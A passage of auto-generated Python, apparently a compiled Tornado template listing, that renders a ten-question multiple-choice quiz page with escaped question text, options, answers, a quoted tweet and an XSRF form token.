 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
